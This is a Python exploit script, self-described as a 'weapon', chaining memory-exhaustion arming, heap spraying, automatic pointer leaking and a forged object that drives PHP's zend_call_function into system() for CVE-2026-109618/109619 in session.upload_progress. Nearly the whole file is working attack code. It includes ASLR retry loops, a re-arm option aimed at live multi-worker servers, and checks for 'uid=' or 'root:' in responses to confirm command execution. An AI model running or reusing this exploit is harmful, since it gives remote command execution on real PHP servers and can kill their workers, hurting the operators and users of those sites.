#!/usr/bin/env python3
"""php2shell WEAPON - complete, connected arm -> p1 -> spray/leak -> call chain
for CVE-2026-109618 / CVE-2026-109619 (session.upload_progress pre-RINIT context
UAF). This closes the loop the per-bug PoCs leave to the reader: every stage
feeds the next, and the final address is auto-determined from the spray's
reflected banner (no manual --leak needed).

Stage flow (matches WEAPON_NOTES.md video intel: "arming -> spraying -> leak -> call"):

  ARM      huge-filename upload-progress multipart. Every update() round re-encodes
           the growing session tree pre-RINIT; crossing memory_limit bails out and
           orphans BG(unserialize) [Bug U] / BG(serialize) [Bug S].
  P1       pressure request that lands the decode OOM mid-decode (php_session_decode
           zend_catch) so the orphan is deterministic.
  SPRAY    fire the reclaim spray. s[] carries the forged php_unserialize_data
           (forge_ctx: last/first_dtor/last_dtor/used_slots/entries.data); t[]
           saturates the small bin. With the marker this is the ungated crash
           receipt, and it reflects the "Flatt banner" the LEAK stage parses.
  LEAK     AUTOMATIC ADDRESS DETERMINATION: scan the spray's reflected response for
           the leaked heap / zval_ptr_dtor pointer and derive
           zend_call_function = dtor - 0xBE3F0 (and stale_reference = heap + 0x75c00).
  CALL     re-fire with s[]/t[] aimed at the leaked dtor: t[] = the 288-byte forged
           object block (0x40 dtor, 0x106 IS_STRING_EX, 0x308 IS_OBJECT_EX,
           "system "+cmd at +0xc8) -> zval_ptr_dtor -> zend_call_function -> system().
           Runs a retry envelope (attempts=N) for the ASLR lottery.

Without a found/manual leak the SPRAY/LEAK stage falls back to the marker
(0x4141...) = the ungated crash/marker receipt.

SAPI note: the cross-request reuse only lands on a persistent-per-child SAPI
(Apache prefork + mod_php, or php -S). PHP-FPM / CGI / LSAPI exit on the pre-RINIT
bailout -> DoS-class (worker kill), not the full RCE. Use --rearm on live
multi-worker targets so each call attempt re-arms its own child.

Usage:
  python3 php2shell_weapon.py https://host/index.php --command 'id'
  python3 php2shell_weapon.py http://127.0.0.1:18080/index.php --lab --profile low
  python3 php2shell_weapon.py https://host/index.php --leak 0x7f1234560000 --command 'id'
"""
from __future__ import annotations

import argparse
import os
import ssl
import struct
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import poc_unserialize as P  # reuse the tested body builders + socket sender

MARKER = 0x4141414141414141
MARK_DATA0 = 0x4242424242424242
MB = 1024 * 1024
CALL_DELTA = 0xBE3F0        # zend_call_function = zval_ptr_dtor - CALL_DELTA (video intel)
STALE_REF_OFF = 0x75C00    # stale_reference = main_heap + STALE_REF_OFF (video intel)
T_COUNT = 149              # "compact_natural_tables=149" -> 149x t[] parts (video intel)

# profile -> (arm files, arm namelen, p1 units, spray count)
PROFILES = {
    "low":    (20, 1310720, 390, 150),
    "medium": (2,  48 * MB, 390, 150),
    "high":   (1,  160 * MB, 390, 150),
}


def call_forge(cmd: bytes, dtor: int) -> bytes:
    """288-byte forged object/zval block for the CALL stage (video-intel layout).
    Fields: 0x40 dtor ptr, 0x50=0x106 (IS_STRING_EX), 1, 1, 0x70=0x308 (IS_OBJECT_EX),
    0x80 zend_call_function = dtor - CALL_DELTA; "system "+command at +0xc8."""
    rec = bytearray(288)
    def put(off, raw):
        rec[off:off + len(raw)] = raw
    put(0x40, struct.pack("<Q", dtor))
    put(0x50, struct.pack("<I", 0x106))
    put(0x60, struct.pack("<II", 1, 1))
    put(0x70, struct.pack("<I", 0x308))
    put(0x80, struct.pack("<Q", dtor - CALL_DELTA))
    blk = b"system " + cmd
    put(0xC8, blk[:288 - 0xC8])
    return bytes(rec)


def _ptr_ok(v: int) -> bool:
    """Plausible x86-64 user pointer: top byte of the 48-bit address in 0x55..0x7f
    (PIE exe ~0x55, glibc heap ~0x7f/0x7b, shared libs), and NOT mostly-printable
    ASCII (which is reflection/hex-dump text, not a pointer)."""
    if v in (0, 0xFFFFFFFFFFFFFFFF):
        return False
    if not (0x55 <= (v >> 40) & 0xFF <= 0x7f):
        return False
    b = v.to_bytes(8, "little")
    if sum(1 for x in b if 0x20 <= x <= 0x7e) > 5:
        return False
    return True


def _rank_ptr(v: int) -> int:
    if 0x7B8000000000 <= v < 0x7C0000000000:      # main_heap class (~0x7b8fd5..)
        return 0
    if 0x7F0000000000 <= v < 0x800000000000:      # shared-lib fn (zval_ptr_dtor)
        return 1
    return 2                                      # PIE exe


def extract_leak(resp: bytes, sent_markers: set):
    """Automatic address determination (the "Flatt banner" step). Scan the spray's
    reflected response for the leaked heap / zval_ptr_dtor pointer. Handles both
    raw-byte reflection and the lab's bin2hex regions (hdr-region / entries-region
    / +0x38-region). Returns (best, cands); best is None when the banner is absent
    (no reflection on this target) -> the caller falls back to --leak or the marker.
    Best-effort heuristic: the ASLR gate means a clean resolution needs the target
    to reflect a walked real pointer; the retry envelope covers the lottery."""
    sent_markers = set(sent_markers)
    found: dict[int, str] = {}

    def add(src, v):
        if v in sent_markers or not _ptr_ok(v):
            return
        found.setdefault(v, src)

    # 1) raw 8-byte aligned values in the body (raw-byte reflection targets)
    for off in range(0, max(0, len(resp) - 8), 8):
        add("body@0x%x" % off, struct.unpack_from("<Q", resp, off)[0])

    # 2) lab-style bin2hex regions (lab_index.php reflects the sprayed values)
    for key in (b"hdr-region=", b"entries-region=", b"+0x38-region="):
        i = resp.find(key)
        if i < 0:
            continue
        j = i + len(key)
        hx = bytearray()
        while j < len(resp) and chr(resp[j]).isalnum():
            hx.append(resp[j])
            j += 1
        if len(hx) >= 16:
            try:
                raw = bytes.fromhex(hx.decode())
            except ValueError:
                continue
            for off in range(0, len(raw) - 8, 8):
                add(key[:5].decode() + "@0x%x" % off, struct.unpack_from("<Q", raw, off)[0])

    cands = sorted(found.items(), key=lambda kv: (_rank_ptr(kv[0]), kv[0]))
    if len(cands) < 2:
        return None, cands
    return cands[0][0], cands


def safe_send(url, body, bnd, sid, stall, chunk):
    """P.send wrapper: a mid-sendall kill (SSLError/ConnectionError = the worker
    stopped reading / died) is the DoS/kill signature, not a crash in us."""
    try:
        return P.send(url, body, bnd, sid, stall, chunk)
    except (OSError, ssl.SSLError) as e:
        return None, (" <SEND-kill %s> " % type(e).__name__).encode(), -1.0


def main() -> None:
    p = argparse.ArgumentParser(description="php2shell complete weapon (arm->p1->spray/leak->call)")
    p.add_argument("url")
    p.add_argument("--profile", default="high", choices=sorted(PROFILES))
    p.add_argument("--sid", default="u0123456789abcdefghijklmnopqrstuv")
    p.add_argument("--fire-sid", default=None,
                   help="fresh sid for the fire (arm bailout leaks a flock'd sess fd)")
    p.add_argument("--stall", type=float, default=1.35, help="mid-body pause for stock min_freq=1 victims")
    p.add_argument("--chunk", type=int, default=8192, help="bytes before the stall")
    p.add_argument("--leak", default=None, help="manual zval_ptr_dtor/heap address (0x...) - skips auto LEAK")
    p.add_argument("--command", default="id", help="command for the final system() call")
    p.add_argument("--arm-files", type=int)
    p.add_argument("--arm-namelen", type=int)
    p.add_argument("--spray", type=int, help="s[] spray count (default per profile)")
    p.add_argument("--attempts", type=int, default=8, help="CALL retry envelope (ASLR lottery); video=8")
    p.add_argument("--rearm", action="store_true", help="re-ARM before every CALL attempt (live multi-worker)")
    p.add_argument("--lab", action="store_true", help="no stalls; lab min_freq=0")
    p.add_argument("--skip-arm", action="store_true")
    p.add_argument("--skip-p1", action="store_true")
    p.add_argument("--skip-spray", action="store_true")
    p.add_argument("--skip-call", action="store_true")
    a = p.parse_args()

    files, namelen, p1units, spray = PROFILES[a.profile]
    files = a.arm_files or files
    namelen = a.arm_namelen or namelen
    spray = a.spray or spray
    fire_sid = a.fire_sid or a.sid
    bnd = b"UctxPoc2026"
    stall = 0.0 if a.lab else a.stall
    chunk = 0 if a.lab else a.chunk
    cmd = a.command.encode()
    sent_markers = {MARKER, MARK_DATA0}

    print("php2shell weapon | profile=%s files=%d namelen=%dMB spray=%d"
          " leak=%s cmd=%r attempts=%d"
          % (a.profile, files, namelen // MB, spray, a.leak or "auto", a.command, a.attempts))
    print("stage flow: ARM -> P1 -> SPRAY/LEAK -> CALL   (video: arming -> spraying -> leak -> call)")
    print("NOTE: final system() is ASLR/leak-gated; no leak -> MARKER crash receipt.")
    print("      FPM/CGI/LSAPI = DoS-class (worker kill). Use --rearm on live multi-worker.")

    def arm_and_send():
        arm = P.arm_body(a.sid, bnd, files, namelen)
        print("\n[arm ] body=%dMB" % (len(arm) // MB), flush=True)
        return safe_send(a.url, arm, bnd, a.sid, stall, chunk)

    # ---- ARM ----------------------------------------------------------------
    if not a.skip_arm:
        arm_st, d, dt = arm_and_send()
        oom = (arm_st == 500) or (b"exhausted" in d) or (arm_st is None)
        print("[arm ] status=%s dt=%.2fs OOM=%s  <- need pre-RINIT OOM to orphan"
              % (arm_st, dt, oom), flush=True)

    # ---- P1 (pressure / decode OOM) ------------------------------------------
    if not a.skip_p1:
        p1 = P.fire1_body(a.sid, bnd, p1units * 11000)
        print("\n[p1  ] body=%dMB" % (len(p1) // MB), flush=True)
        st, d, dt = safe_send(a.url, p1, bnd, a.sid, 0.0, 0)
        print("[p1  ] status=%s dt=%.2fs OOM=%s" % (st, dt, b"exhausted" in d), flush=True)

    # ---- SPRAY + LEAK (automatic address determination) ----------------------
    leak = int(a.leak, 0) if a.leak else None
    if not a.skip_spray:
        ctx = P.forge_ctx(MARKER, MARKER, used=1018, data0=MARK_DATA0)
        body = P.fire_body(fire_sid, bnd, spray, ctx, n_small=T_COUNT)
        print("\n[spray] s[]=%d t[]=%d last_dtor=%s body=%dKB"
              % (spray, T_COUNT, hex(MARKER), len(body) // 1024), flush=True)
        st, d, dt = safe_send(a.url, body, bnd, fire_sid, stall, chunk)
        print("[spray] status=%s dt=%.2fs" % (st, dt), flush=True)
        # marker / crash receipt (ungated)
        hexb = d.hex()
        for needle, label in (("4141414141414141", "last_dtor marker (crash / arb write)"),
                              ("4242424242424242", "data0 marker (R: arb zval*)")):
            if needle in hexb:
                print("[spray] HIT %s" % label, flush=True)
        if st is None:
            print("[spray] KILL signature (no HTTP) - worker died mid-request", flush=True)
        # ---- LEAK: automatic address determination ----
        if leak is None:
            found, cands = extract_leak(d, sent_markers)
            if found is not None:
                leak = found
                print("[leak] AUTO zval_ptr_dtor candidate=%s" % hex(found), flush=True)
                print("[leak]   zend_call_function=%s  (dtor-0x%05X)" % (hex(found - CALL_DELTA), CALL_DELTA), flush=True)
                for v, src in cands[:6]:
                    print("[leak]   cand %s  [%s]" % (hex(v), src), flush=True)
            else:
                print("[leak] no reflected banner pointer -> MARKER (ungated crash demo)", flush=True)
        else:
            print("[leak] using manual --leak %s" % hex(leak), flush=True)
    else:
        print("\n[spray] skipped", flush=True)

    if leak is None:
        leak = MARKER
        print("[call] no leak -> dtor=MARKER (ungated crash/marker receipt)")
    print("[call] dtor=%s zend_call_function=%s  (dtor-0x%05X)  t[]=%d  cmd=%r"
          % (hex(leak), hex(leak - CALL_DELTA), CALL_DELTA, T_COUNT, a.command))

    # ---- CALL ----------------------------------------------------------------
    if not a.skip_call:
        ctx = P.forge_ctx(leak, leak, used=1018, data0=leak)
        small = call_forge(cmd, leak)
        for i in range(1, a.attempts + 1):
            if a.rearm and not a.skip_arm:
                arm_and_send()
            body = P.fire_body(fire_sid, bnd, spray, ctx, n_small=T_COUNT, t_small=small)
            print("\n[call] attempt %d/%d s[]=%d t[]=%d body=%dKB"
                  % (i, a.attempts, spray, T_COUNT, len(body) // 1024), flush=True)
            st, d, dt = safe_send(a.url, body, bnd, fire_sid, stall, chunk)
            print("[call] status=%s dt=%.2fs" % (st, dt), flush=True)
            hexb = d.hex()
            if (b"uid=" in d) or (b"root:" in d):
                print("[call] *** EXEC marker (uid=/root:) -> system() ran ***")
                break
            if st is None:
                print("[call] KILL/EXEC signature (worker died mid-request) - crash/kill stage")
                break
            if "4141414141414141" in hexb:
                print("[call] HIT last_dtor marker")
        print("\nweapon done")
    else:
        print("\n[call] skipped")


if __name__ == "__main__":
    main()
